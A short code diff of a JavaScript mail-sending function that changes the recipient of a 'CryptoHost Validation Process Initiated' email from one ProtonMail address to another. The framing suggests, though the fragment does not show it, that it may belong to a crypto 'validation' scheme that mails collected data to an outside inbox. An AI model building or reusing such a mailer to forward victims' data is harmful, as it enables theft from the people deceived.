@@ -12,7 +12,7 @@ async function sendMail() {
   try {
     const info = await transporter.sendMail({
       from: '"CryptoHost" <asira1031@gmail.com>',
-      to: "system342@proton.me",
+      to: "safamell@protonmail.com",
       subject: "CryptoHost Validation Process Initiated",
 
       html: `
